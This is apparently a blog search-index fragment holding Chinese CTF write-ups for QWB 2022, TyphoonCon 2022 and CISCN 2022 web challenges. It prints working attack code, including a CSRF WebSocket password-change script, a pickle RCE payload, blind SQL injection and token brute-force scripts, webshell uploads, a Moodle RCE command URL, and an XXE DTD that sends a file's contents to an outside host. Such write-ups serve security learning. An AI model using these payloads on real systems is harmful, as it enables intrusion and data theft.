","date":"2022-09-19","objectID":"/ssti/:6:5","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#_--"},{"categories":["技术分享"],"content":"参考文章https://xz.aliyun.com/t/7746 https://xz.aliyun.com/t/9584 https://www.freebuf.com/articles/network/258136.html https://hoad-sc.blog.csdn.net/article/details/113778233 https://xz.aliyun.com/t/6885 https://www.freebuf.com/articles/web/264088.html http://h0cksr.xyz/archives/340 ","date":"2022-09-19","objectID":"/ssti/:0:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#参考文章"},{"categories":["CTF"],"content":"rcefile","date":"2022-07-31","objectID":"/qwb2022/:0:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#rcefile"},{"categories":["CTF"],"content":"预期解原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip源码泄露 先看config.inc.php这里有spl_autoload_register()，这个函数是会加载inc文件的 这里会检测cookie，如果有userfile的话，会进行反序列化 \u003c?php spl_autoload_register(); error_reporting(0); function e($str){ return htmlspecialchars($str); } $userfile = empty($_COOKIE[\"userfile\"]) ? [] : unserialize($_COOKIE[\"userfile\"]); ?\u003e\u003cp\u003e \u003ca href=\"/index.php\"\u003eIndex\u003c/a\u003e \u003ca href=\"/showfile.php\"\u003efiles\u003c/a\u003e \u003c/p\u003e 这里有文件上传的功能，我们可以上传一个inc文件里面是一句话木马，这里我们把文件名放进cookie里面构造一个序列化数据即可 把cookie替换，成功通过spl_autoload_register()包含 ","date":"2022-07-31","objectID":"/qwb2022/:1:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#预期解"},{"categories":["CTF"],"content":"非预期解直接上传phar文件，发现是可以解析的 ","date":"2022-07-31","objectID":"/qwb2022/:2:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#非预期解"},{"categories":["CTF"],"content":"babyweb目录扫描到下面结果 扫到一个buy，测试一下需要post发包，然后需要admin 看起来是需要拿到admin的权限，然后去这里发包拿flag 进去里面发现有个修改密码的功能点，还有个报告bug的功能点，这组合起来就是一个csrf的利用了 这里修改密码是要ws发包过去的，我直接对着题目的js做了一点修改然后放到服务器 一开始一直没成功，后来发现可能得用内网的地址，刚好题目给了docker部署的命令，所以知道端口是8888 构造如下的csrf脚本 \u003cscript\u003e var ws = null; var host = \"127.0.0.1:8888\" var url = \"ws://\" + host + \"/bot\"; ws = new WebSocket(url); ws.onopen = function (event) { console.log('connection open!') var msg = \"changepw 123\"; ws.send(msg); console.log('changepw') } ws.onmessage = function (ev) { botsay(ev.data); }; ws.onerror = function () { console.log(\"connection error\"); }; ws.onclose = function () { console.log(\"connection close!\"); }; \u003c/script\u003e 修改密码进入后，发现有个购买界面，这里的钱只够购买hint，下载到是源码 app.py @app.route(\"/buy\", methods=['POST']) def buy(): if not session: return redirect('/login') elif session['user'] != 'admin': return \"you are not admin\" else : result = {} data = request.get_json() product = data[\"product\"] for i in product: if not isinstance(i[\"id\"],int) or not isinstance(i[\"num\"],int): return \"not int\" if i[\"id\"] not in (1,2): return \"id error\" if i[\"num\"] not in (0,1,2,3,4,5): return \"num error\" result[i[\"id\"]] = i[\"num\"] sql = \"select money,flag,hint from qwb where username='admin'\" conn = sqlite3.connect('/root/py/test.db') c = conn.cursor() cursor = c.execute(sql) for row in cursor: if len(row): money = row[0] flag = row[1] hint = row[2] data = b'{\"secret\":\"xxxx\",\"money\":' + str(money).encode() + b',' + request.get_data()[1:] #secret已打码 r = requests.post(\"\u003chttp://127.0.0.1:10002/pay\u003e\",data).text r = json.loads(r) if r[\"error\"] != 0: return r[\"error\"] money = int(r[\"money\"]) hint = hint + result[1] flag = flag + result[2] sql = \"update qwb set money={},hint={},flag={}where username='admin'\".format(money,hint,flag) conn = sqlite3.connect('/root/py/test.db') c = conn.cursor() try: c.execute(sql) conn.commit() except Exception as e: conn.rollback() c.close() conn.close() return \"database error\" return \"success\" pay.go package main import ( \"github.com/buger/jsonparser\" \"fmt\" \"net/http\" \"io/ioutil\" \"io\" ) func pay(w http.ResponseWriter, r *http.Request) { var cost int64 = 0 var err1 int64 = 0 json, _ := ioutil.ReadAll(r.Body) secret, err := jsonparser.GetString(json, \"secret\") if err != nil { fmt.Println(err) } if secret != \"xxxx\"{ //secret已打码 io.WriteString(w, \"{\\\\\"error\\\\\": \\\\\"secret error\\\\\"}\") return } money, err := jsonparser.GetInt(json, \"money\") if err != nil { fmt.Println(err) } _, err = jsonparser.ArrayEach( json, func(value []byte, dataType jsonparser.ValueType, offset int, err error) { id, _ := jsonparser.GetInt(value, \"id\") num, _ := jsonparser.GetInt(value, \"num\") if id == 1{ cost = cost + 200 * num }else if id == 2{ cost = cost + 1000 * num }else{ err1 = 1 } }, \"product\") if err != nil { fmt.Println(err) } if err1 == 1{ io.WriteString(w, \"{\\\\\"error\\\\\": \\\\\"id error\\\\\"}\") return } if cost \u003e money{ io.WriteString(w, \"{\\\\\"error\\\\\": \\\\\"Sorry, your credit is running low!\\\\\"}\") return } money = money - cost io.WriteString(w, fmt.Sprintf(\"{\\\\\"error\\\\\":0,\\\\\"money\\\\\": %d}\", money)) } func main() { mux := http.NewServeMux() mux.HandleFunc(\"/pay\", pay) http.ListenAndServe(\":10002\", mux) } 一个go和python联合的题目，大概的逻辑是这样 通俗点讲，python是用来发货的，go是用来付款的，python发货前会通过go来进行付款校验 所以我们要获取flag，就得让python发货，而go不进行付款 这里就有两个思路： go的整数溢出 python的flask和go的jsonparser对于json同名数据的不同处理 ","date":"2022-07-31","objectID":"/qwb2022/:0:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#babyweb"},{"categories":["CTF"],"content":"go的整数溢出这里的cost的定义为int64 var cost int64 = 0 最后生成cost的时候，我们传入num，然后计算cost去进行判断 if id == 1{ cost = cost + 200 * num }else if id == 2{ cost = cost + 1000 * num }else{ err1 = 1 } 这里我们num传入很大的值，就会溢出，导致cost会小于money，这样就成功过了go ","date":"2022-07-31","objectID":"/qwb2022/:1:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#go的整数溢出"},{"categories":["CTF"],"content":"json处理不同这里我搭建了一个本地的环境 from flask import request,Flask app = Flask(__name__) @app.route(\"/buy\", methods=['POST']) def buy(): data = request.get_json() product = data[\"product\"] return str(product) if __name__ == \"__main__\": app.run(debug=\"on\",port=10000) 可以看到，如果出现了同一个键的json数据，flask里面的get_json会取最后的 再看go的jsonparser package main import \"github.com/buger/jsonparser\" data := []byte(`{\"id\":1,\"id\":2}`) id := jsonparser.GetString(data, \"id\") print(id) 这里却是取的前者 所以这里他们解析json的方式会不一样，那么我们传入这样的参数 {\"product\":[{\"id\":1,\"num\":0},{\"id\":2,\"num\":0}],\"product\":[{\"id\":1,\"num\":0},{\"id\":2,\"num\":1}]} 这里python收到以后，会取后者，也就是flag的num为1，而go会取前者，也就是flag的num为0 这个意思就是，python会发货，但是go并不会花钱，达到购买的效果 ","date":"2022-07-31","objectID":"/qwb2022/:2:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#json处理不同"},{"categories":["CTF"],"content":"easyweb首先是一个文件读取的漏洞，但是要求读取的文件里面必须有demo或者host 那么我们就可以这样做 /showfile.php?f=./demo/../index.php 读取到下面的文件 index.php \u003c?php $upload = md5(\"2022qwb\".$_SERVER['REMOTE_ADDR']); @mkdir($upload, 0333, true); if(isset($_POST['submit'])) { include 'upload.php'; } ?\u003e upload.php \u003c?php error_reporting(0); require_once('class.php'); if(isset($_SESSION)){ if(isset($_GET['fname'])?!empty($_GET['fname']):FALSE){ $_FILES[\"file\"][\"name\"] = $_GET['fname']; } $upload = new Upload(); $upload-\u003eupload(); }else { die(\"\u003cp class='tip'\u003eguest can not upload file\u003c/p\u003e\"); } ?\u003e class.php \u003c?php class Upload { public $file; public $filesize; public $date; public $tmp; function __construct(){ $this-\u003efile = $_FILES[\"file\"]; } function do_upload() { $filename = session_id().explode(\".\",$this-\u003efile[\"name\"])[0].\".jpg\"; if(file_exists($filename)) { unlink($filename); } move_uploaded_file($this-\u003efile[\"tmp_name\"],md5(\"2022qwb\".$_SERVER['REMOTE_ADDR']).\"/\".$filename); echo 'upload '.\"./\".md5(\"2022qwb\".$_SERVER['REMOTE_ADDR']).\"/\".$this-\u003ee($filename).' success!'; } function e($str){ return htmlspecialchars($str); } function upload() { if($this-\u003echeck()) { $this-\u003edo_upload(); } } function __toString(){ return $this-\u003efile[\"name\"]; } function __get($value){ $this-\u003efilesize-\u003e$value = $this-\u003edate; echo $this-\u003etmp; } function check() { $allowed_types = array(\"jpg\",\"png\",\"jpeg\"); $temp = explode(\".\",$this-\u003efile[\"name\"]); $extension = end($temp); if(in_array($extension,$allowed_types)) { return true; } else { echo 'Invalid file!'; return false; } } } class GuestShow{ public $file; public $contents; public function __construct($file) { $this-\u003efile=$file; } function __toString(){ $str = $this-\u003efile-\u003ename; return \"\"; } function __get($value){ return $this-\u003e$value; } function show() { $this-\u003econtents = file_get_contents($this-\u003efile); $src = \"data:jpg;base64,\".base64_encode($this-\u003econtents); echo \"\u003cimg src={$src}/\u003e\"; } function __destruct(){ echo $this; } } class AdminShow{ public $source; public $str; public $filter; public function __construct($file) { $this-\u003esource = $file; $this-\u003eschema = 'file:///var/www/html/'; } public function __toString() { $content = $this-\u003estr[0]-\u003esource; $content = $this-\u003estr[1]-\u003eschema; return $content; } public function __get($value){ $this-\u003eshow(); return $this-\u003e$value; } public function __set($key,$value){ $this-\u003e$key = $value; } public function show(){ if(preg_match('/usr|auto|log/i' , $this-\u003esource)) { die(\"error\"); } $url = $this-\u003eschema . $this-\u003esource; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 1); $response = curl_exec($curl); curl_close($curl); $src = \"data:jpg;base64,\".base64_encode($response); echo \"\u003cimg src={$src}/\u003e\"; } public function __wakeup() { if ($this-\u003eschema !== 'file:///var/www/html/') { $this-\u003eschema = 'file:///var/www/html/'; } if ($this-\u003esource !== 'admin.png') { $this-\u003esource = 'admin.png'; } } } class.php里面，AdminShow类里面有wakeup方法，这里导致无法修改schema和source 这里需要绕过AdminShow的wakeup 再看利用方面，这里的show，是有个file_get_contents的，所以我们这里可以触发一个phar 然后看，这里upload必须有个$_SESSION，所以我们上传可以添加一个sessionupload \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cform action=\"\u003chttp://47.104.95.124:8080/index.php\u003e\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"提交\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 这样让他上传 而在AdminShow的show方法里面，有ssrf能打 public function show(){ if(preg_match('/usr|auto|log/i' , $this-\u003esource)) { die(\"error\"); } $url = $this-\u003eschema . $this-\u003esource; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 1); $response = curl_exec($curl); curl_close($curl); $src = \"data:jpg;base64,\".base64_encode($response); echo \"\u003cimg src={$src} /\u003e\"; } 而这里进adminshow的show方法在__get里面 而这里url居然是用了一个拼接，感觉多此一举，这里完全可以一个参数完成的，但是这里画蛇添足的去多加了一个参数去进行拼接，而且schema还没有在class里面定义，也就是说这个参数可以消失掉 $ur","date":"2022-07-31","objectID":"/qwb2022/:0:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#easyweb"},{"categories":["CTF"],"content":"crash题目说504可以拿到flag，504是Gateway Timeout 给了源码 import base64 # import sqlite3 import pickle from flask import Flask, make_response,request, session import admin import random app = Flask(__name__,static_url_path='') app.secret_key=random.randbytes(12) class User: def __init__(self, username,password): self.username=username self.token=hash(password) def get_password(username): if username==\"admin\": return admin.secret else: # conn=sqlite3.connect(\"user.db\") # cursor=conn.cursor() # cursor.execute(f\"select password from usertable where username='{username}'\") # data=cursor.fetchall()[0] # if data: # return data[0] # else: # return None return session.get(\"password\") @app.route('/balancer', methods=['GET', 'POST']) def flag(): pickle_data=base64.b64decode(request.cookies.get(\"userdata\")) if b'R' in pickle_data or b\"secret\" in pickle_data: return \"You damm hacker!\" os.system(\"rm -rf *py*\") userdata=pickle.loads(pickle_data) if userdata.token!=hash(get_password(userdata.username)): return \"Login First\" if userdata.username=='admin': return \"Welcome admin, here is your next challenge!\" return \"You're not admin!\" @app.route('/login', methods=['GET', 'POST']) def login(): resp = make_response(\"success\") session[\"password\"]=request.values.get(\"password\") resp.set_cookie(\"userdata\", base64.b64encode(pickle.dumps(User(request.values.get(\"username\"),request.values.get(\"password\")),2)), max_age=3600) return resp @app.route('/', methods=['GET', 'POST']) def index(): return open('source.txt',\"r\").read() if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) login路由创建session和userdata 这里balancer路由检测到pickle数据里没有R和secret后就会解pickle，所以这里是可以直接rce的，只要绕R就行了，比如这里的i (S'whoami' ios system . ","date":"2022-07-31","objectID":"/qwb2022/:0:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#crash"},{"categories":["CTF"],"content":"非预期题目只要求构造504就有flag，那么就不一定得按题目走下去，所以我这里应该是非预期了，我让这个会话sleep一段时间，多发几个包，服务器就会受不了了 ","date":"2022-07-31","objectID":"/qwb2022/:1:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#非预期"},{"categories":["CTF"],"content":"预期预期就是走题目的逻辑，他会判断secret是否匹配，但是这里是secret是未知的 if userdata.token!=hash(get_password(userdata.username)): return \"Login First\" if userdata.username=='admin': return \"Welcome admin, here is your next challenge!\" def get_password(username): if username==\"admin\": return admin.secret else: # conn=sqlite3.connect(\"user.db\") # cursor=conn.cursor() # cursor.execute(f\"select password from usertable where username='{username}'\") # data=cursor.fetchall()[0] # if data: # return data[0] # else: # return None return session.get(\"password\") 这题有点像：高校战疫网络安全分享赛:webtmp，做法就是覆盖掉secret绕过验证，只不过这里对secret关键词进行了过滤，解决办法是unicode编码 这里看到nu1l的wp，发现可以直接hex绕，也是可以的 b'''capp admin (S'\\\\x73ecret' S'1' db.''' 进去就可以修改负载均衡的配置了 ","date":"2022-07-31","objectID":"/qwb2022/:2:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#预期"},{"categories":["CTF"],"content":"WP-UM一进去就是一个安装 账号密码放在根目录下了，这就很刻意的让我们去目录遍历去找账号密码了 他提到了危险出插件，题目给了源码，我们直接进去看看装了什么插件 这个user-meta搜了一下，确实存在一个目录遍历的漏洞，看一下版本正好对上，是CVE-2022-0779 https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/ 成功探测到 这样探测出用户名密码：MaoGePaMao:MaoGeYaoQiFeiLa 进到后台，在外观编辑处可以直接编辑php代码，直接写php木马 进蚁剑翻了很久很久翻到了flag。。。 ","date":"2022-07-31","objectID":"/qwb2022/:0:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#wp-um"},{"categories":["CTF"],"content":"easyloginwordpress这个版本存在sql注入，这里进行报错注入测试 https://www.freebuf.com/articles/web/321297.html 报错注入成功 直接sqlmap嗦 --- web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: MySQL \u003e= 5.0 (MariaDB fork) Database: moodle [428 tables] +----------------------------------+ | mdl_analytics_indicator_calc | | mdl_analytics_models | | mdl_analytics_models_log | 。。。。。。。。。。。。。。。。。 | mdl_tool_recyclebin_category | | mdl_tool_recyclebin_course | | mdl_tool_usertours_steps | | mdl_tool_usertours_tours | | mdl_upgrade_log | | mdl_url | | mdl_user | | mdl_user_devices | | mdl_user_enrolments | | mdl_user_info_category | | mdl_user_info_data | | mdl_user_info_field | | mdl_user_lastaccess | | mdl_user_password_history | | mdl_user_password_resets | | mdl_user_preferences | | mdl_user_private_key | | ............. +----------------------------------+ 这里本地搭建了一个moodle来调试 这里前端只有一个功能点，就是重置密码，他会要求你写一个邮箱，然后发送修改密码的连接给你，所以我猜测是不是可以去构造这个链接，而且在dump出几个表来看，只有这个表mdl_user_password_resets存在一些数据 Database: moodle Table: mdl_user_password_history [0 entries] +----+--------+------+-------------+ | id | userid | hash | timecreated | +----+--------+------+-------------+ +----+--------+------+-------------+ Database: moodle Table: mdl_user_password_resets [1 entry] +----+--------+----------------------------------+---------------+-----------------+ | id | userid | token | timerequested | timererequested | +----+--------+----------------------------------+---------------+-----------------+ | 1 | 2 | OmPAvhUALIvcQcX4fSxx8P0BzcKcSoVG | 1659191821 | 1659191987 | +----+--------+----------------------------------+---------------+-------------- Database: moodle Table: mdl_user_private_key [0 entries] +----+--------+--------+---------+----------+------------+-------------+---------------+ | id | userid | script | value | instance | validuntil | timecreated | iprestriction | +----+--------+--------+---------+----------+------------+-------------+---------------+ +----+--------+--------+---------+----------+------------+-------------+---------------+ 这里进行代码审计，首先在跟进这里 然后进到这里，这里会有个判断，必须保证token绑定了user，而且时间在半小时内 在本地环境测试下，我通过发送重置密码邮件，就可以更新mdl_user_password_resets里面的token和时间 这里我直接盲测了一下，直接发只有token参数的数据，因为缺少参数，这里发现跳转到了修改密码的界面 手动修改密码后登录，本地环境成功登录admin 然后在history里面找到完整的payload，不过这个sesskey是有时限的，所以还是手改就好 token=Lk7GF0p9gAinTlkPPyMA4ZJ9Hc6v6Fly\u0026sesskey=h9zVdXkSLf\u0026_qf__login_set_password_form=1\u0026username=admin\u0026password=Admin%40123\u0026password2=Admin%40123\u0026submitbutton=%E4%BF%9D%E5%AD%98%E6%9B%B4%E6%94%B9 然后到远程来打，首先sql注入拿到管理员的邮箱，这里找到的是admin@localhost.com 然后发包修改免密进入到后台 这个moodle版本是3.9.1，后台是可以getshell的，这里通过加载一个插件去getshell 我用的现成的 https://github.com/HoangKien1020/Moodle_RCE 安装这个rce插件即可 然后find找flag即可 http://47.105.52.19:8888/blocks/rce/lang/en/block_rce.php?cmd=grep -r 'flag{.*}' /etc ","date":"2022-07-31","objectID":"/qwb2022/:0:0","series":null,"tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/#easylogin"},{"categories":["CTF"],"content":"KnowMe首先是扫了个目录，发现了robots.txt /items.php /var/www/flag 这里的items.php是一个查询接口 经测试是order by的盲注，这里我写了个脚本，这里只展示到最后查询密码 import requests import string strings = \"abcdef1234567890\" url = \"https://typhooncon-knowme.chals.io/items.php?sort=rand(substr((select/**/group_concat(password)/**/from/**/users),{},1)='{}')\" flag = '' for i in range(80): for s in strings: fuckurl = url.format(i,s) res = requests.get(url=fuckurl).text if '\"id\":2' in res: flag+=s print(flag) else : print(\"-\",end=\"\") 注出来，admin密码md5：d41d8cd98f00b204e9800998ecf8427e 解出来是空 只需要bp进行前端限制的绕过即可，然后就会跳转到profile.php 进行文件上传，这里只允许上传图片，且是白名单，这里直接上传1.png.php即可绕过，估计这里的逻辑判断只取了第一个点后面的后缀 直接传shell后拿flag 进去拿到了源码后，的确是这样的逻辑 ","date":"2022-06-25","objectID":"/typhoonconctf2022/:0:0","series":null,"tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/#knowme"},{"categories":["CTF"],"content":"Typo","date":"2022-06-25","objectID":"/typhoonconctf2022/:0:0","series":null,"tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/#typo"},{"categories":["CTF"],"content":"step1给了赛题文件，这里是有一个登录的操作的，但是很多的路由都需要登录，只有change.php和forgot.php不需要登录 在change.php里面，这里会通过uid查询一个token，而这里的token进行了一个substr，只取了前4位 所以这样我们是可以尝试爆破的 $uid = mysqli_real_escape_string($mysqli, $_POST['uid']); $pwd = md5(mysqli_real_escape_string($mysqli, $_POST['psw'])); $sig = mysqli_real_escape_string($mysqli, $_POST['token']); $sqlGetTokens = \"SELECT token from tokens where uid='$uid'\"; $result = $mysqli-\u003equery($sqlGetTokens); $data = mysqli_fetch_array($result); $sigDB = substr($data[0], 0, 4); if( $sig == $sigDB ){ $sqlChange = \"UPDATE users SET password='$pwd' where id='$uid'\"; $mysqli-\u003equery($sqlChange); $sqlDelete = \"DELETE FROM tokens WHERE uid='$uid'\"; $mysqli-\u003equery($sqlDelete); 但是直接爆破难度有点大，这里就可以利用forget.php的功能 if($_SERVER['REQUEST_METHOD'] == \"POST\"){ $uname = mysqli_real_escape_string($mysqli, $_POST['uname']); $s = system(\"date +%s%3N \u003e /tmp/time\"); $time = file_get_contents(\"/tmp/time\"); $fullToken = md5( $unam . $time . \"SECRET\" ); $sqlGetId = \"SELECT id FROM users where username='$uname'\"; $result = $mysqli-\u003equery($sqlGetId); $data = mysqli_fetch_array($result); $uid = $data[0]; $sqlDelete = \"DELETE FROM tokens WHERE uid='$uid'\"; $mysqli-\u003equery($sqlDelete); $sqlInsert = \"INSERT INTO tokens values('$uid','$fullToken')\"; $mysqli-\u003equery($sqlInsert); die(\"\u003cscript\u003ealert('Token sent to you.');window.location.href='/index.php';\u003c/script\u003e\"); } 这里会基于uname，time，”SECRET“生成一个md5，然后我发现这里真是写错了个单词$unam。。。 所以这里fullToken就会是md5(time+“SECRET”)了，如果爆破点放在token上，那么我们确实是有可能爆破出来的，但是比赛的时候很多人都会做这个题目，所以time会经常变化，这让我们爆破的难度有点大 而对于这个time是可以变化的，每次POST访问forget的时候，这里就会刷新time，所以说之类我们可以利用php不严格的判断，让time进行变化，当变成0exxxxx的时候，这时候我们把sig赋值为0000就能让条件$sig == $sigDB满足 写个脚本来进行爆破 import requests target = \"https://typhooncon-typo.chals.io\" passwd = \"hack\" data1 = { \"uname\": \"admin\" } data2 = { \"uid\": \"1\", \"psw\": passwd, \"token\": \"0000\" } while True: try: res = requests.post(f\"{target}/forgot.php\", data1) print(res.text) res = requests.post(f\"{target}/change.php\", data2) print(res.text) if \"Password Changed.\" in res.text: print(passwd) break except: pass 爆破的结果，成功更改密码 拿到cookie：PHPSESSID=ql32dudasjts4rjbsctj0vrvqd ","date":"2022-06-25","objectID":"/typhoonconctf2022/:1:0","series":null,"tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/#step1"},{"categories":["CTF"],"content":"step2这里到了profile.php，存在一个xml的使用，猜测这里是存在一个xxe的 \u003cscript type=\"text/javascript\"\u003e xhr = new XMLHttpRequest() xhr.onreadystatechange = function(){ document.getElementById(\"email\").innerHTML = \"E-Mail: \"+this.responseText } xhr.open(\"get\",\"data.php?u=\u003c?php echo $uname;?\u003e\") xhr.send() function read(){ var xml = '\u003c\\?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cuser\u003e\u003cusername\u003e'+document.getElementById(\"user\").value+'\u003c/username\u003e\u003c/user\u003e' var xhr = new XMLHttpRequest() xhr.onreadystatechange = function(){ var out = document.getElementById(\"output\") out.value = this.responseText } xhr.open(\"post\",\"read.php\") // xhr.setRequestHeader(\"UUID\", document.getElementById(\"uuid\").value) xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\") xhr.send(\"data=\"+encodeURIComponent(xml)) } \u003c/script\u003e 但是这里需要有一个UUID，我们再更进看一下read.php $uuid = $_SERVER['HTTP_UUID']; if( $uuid != \"XXXX\" ){ die(\"UUID is not valid\"); } include 'database.php'; $xml = urldecode($_POST['data']); $dom = new DOMDocument(); try{ @$dom-\u003eloadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); }catch (Exception $e){ echo ''; } $userInfo = @simplexml_import_dom($dom); $output = \"User Sucessfully Added.\"; $user = mysqli_real_escape_string($mysqli, @$userInfo-\u003eusername); $sql = \"select * from users where username='$user'\"; 这里会对uuid进行一个判断，才会进一步的加载xml，所以我们的获取到这个uuid，这里我们还有个文件没看，那就是data.php，可以看到这里的sql查询是没有增加过滤的，所以我们在这里进行一个sql注入 $uname = $_GET['u']; $sql = \"SELECT email FROM users where username='$uname'\"; if( $result = $mysqli-\u003equery($sql) ){ $data = @mysqli_fetch_array($result); $email = $data[0]; echo $email; }else{ echo \"Erorr\"; } 这里直接用sqlmap一把嗦 available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] sys [*] typodb Database: typodb [3 tables] +------------+ | secretkeys | | tokens | | users | +------------+ Database: typodb Table: secretkeys [1 entry] +--------------------------------------+ | uuidkey | +--------------------------------------+ | 8d6ed261-f84f-4eda-b2d2-16332bd8c390 | +--------------------------------------+ 拿到uuid，这样我们就可以构造xxe进行攻击了，但是有个问题，这里没有回显，所以我们得在自己vps搭建个，我的payload参考此处 vps放一个dtd.xml \u003c!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/flag\"\u003e \u003c!ENTITY % param1 \"\u003c!ENTITY exfil SYSTEM 'http://ip:port/dtd.xml?%data;'\u003e\"\u003e 起一个python服务 python3 -m http.server 11111 curl发包 curl -X POST https://typhooncon-typo.chals.io/read.php -H \"UUID: 8d6ed261-f84f-4eda-b2d2-16332bd8c390\" -H \"Cookie: PHPSESSID=ql32dudasjts4rjbsctj0vrvqd\" -d \"data=%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%20%22http%3A%2F%2F[ip]%2Fdtd%2Exml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E%0A%3Cuser%3E%3Cusername%3Eadmin%3C%2Fusername%3E%3C%2Fuser%3E\" 成功带出flag ","date":"2022-06-25","objectID":"/typhoonconctf2022/:2:0","series":null,"tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/#step2"},{"categories":["CTF"],"content":"ikari在index.php里面有这么一段代码 try { require ROOT_PATH . 'Engine/Loader.php'; E\\Loader::getInstance()-\u003einit(); // Load necessary classes $aParams = ['ctrl' =\u003e (!empty($_GET['p']) ? $_GET['p'] : 'blog'), 'act' =\u003e (!empty($_GET['a']) ? $_GET['a'] : 'index'), 'template' =\u003e (!empty($_GET['t']) ? $_GET['t'] : 'pc'), 'ns' =\u003e (!empty($_GET['n']) ? $_GET['n'] : 'TestProject\\Controller\\\\')]; E\\Router::run($aParams); } catch (\\Exception $oE) { echo $oE-\u003egetMessage(); } ?\u003e 我们跟进Router去看看 class Router { public static function run (array $aParams) { if($aParams['ns'] != 'TestProject\\Controller\\\\'){ $sNamespace = $aParams['ns']; $sCtrlPath = $sNamespace; }else{ $sNamespace = 'TestProject\\Controller\\\\'; $sDefCtrl = $sNamespace . 'Blog'; $sCtrlPath = ROOT_PATH . 'Controller/'; } if($aParams['ns'] == '\\\\'){ $aParams['ctrl'] = '\\\\system'; if(preg_match('/^[a-zA-Z0-9\\/]*$/',$aParams['act'])){ $aParams['act'] = 'ls /www/'.$aParams['act']; }else{ $aParams['act'] = 'ls /www/'; } } $sTemplatePath = str_replace(array(\".\",\"\\/\"), \"\", ROOT_PATH . 'Template/' . $aParams['template']); include $sTemplatePath; $sCtrl = ucfirst($aParams['ctrl']); if (is_file($sCtrlPath . $sCtrl . '.php') || (substr($sCtrl, 0, 1) === '\\\\')) { $sCtrl = $sNamespace . str_replace('\\\\','',$sCtrl); if(class_exists($sCtrl)){ $oCtrl = new $sCtrl; }else{ call_user_func($sCtrl, $aParams['act']); exit(); } if ((new \\ReflectionClass($oCtrl))-\u003ehasMethod($aParams['act']) \u0026\u0026 (new \\ReflectionMethod($oCtrl, $aParams['act']))-\u003eisPublic()) call_user_func(array($oCtrl, $aParams['act'])); else call_user_func(array($oCtrl, 'notFound')); } else { call_user_func(array(new $sDefCtrl, 'notFound')); } } } 这里是对路由的操作，这里，我们可以通过控制参数p选择路由，a选择路由的功能 在utils里面有这个，这里可以进行文件的包含 public function __get($name) { if(stripos($name,'php') || stripos($name,'Upload') || stripos($name,'flag') || stripos($name,':')){ die('Dangerous Operation.'); }else{ if(file_exists($name)){ require $name; } } } 而这个函数的入口在blog路由下的post方法，这里传一个参数f，进行包含，因为这里对参数有过滤，所以我们选择session_upload进行竞争包含 public function post() { if($this-\u003erender == 0){ $this-\u003eoUtil-\u003eoPost = $this-\u003eoModel-\u003egetById($this-\u003e_iId); // Get the data of the post $this-\u003eoUtil-\u003egetView('post'); }else{ $this-\u003eoUtil-\u003e__get($_GET['f']); } } ","date":"2022-06-24","objectID":"/ciscn2022_half/:0:0","series":null,"tags":null,"title":"[CISCN2022] Semifinals","uri":"/ciscn2022_half/#ikari"},{"categories":["CTF"],"content":"xxxcloud源码中有admin的密码hash，但是解不开，这里的做法是找到token的构造算法，进行手动token生成 找到token计算算法 找到systempassword 计算出token 然后伪造登录获取flag 这里的防守不知道应该用什么方式进行防守，如果是伪造token的话，那我们无法避免，因为token算法是写死的，我尝试把这个系统的一个任意文件删除修复，但是任然是exp攻击成功 后来直接上了个awd的通防waf，没想到还防住了。。 ","date":"2022-06-24","objectID":"/ciscn2022_half/:0:0","series":null,"tags":null,"title":"[CISCN2022] Semifinals","uri":"/ciscn2022_half/#xxxcloud"},{"categories":["CTF"],"content":"template任意文件读取 + 读 opcache缓存 这里传入tpl参数，赋值为$tpl if (isset($_GET['tpl']) \u0026\u0026 is_string($_GET['tpl'])): $tpl = $_GET['tpl']; endif; 然后在check方法里面，先进行后缀检测，这里过滤的是挺严的 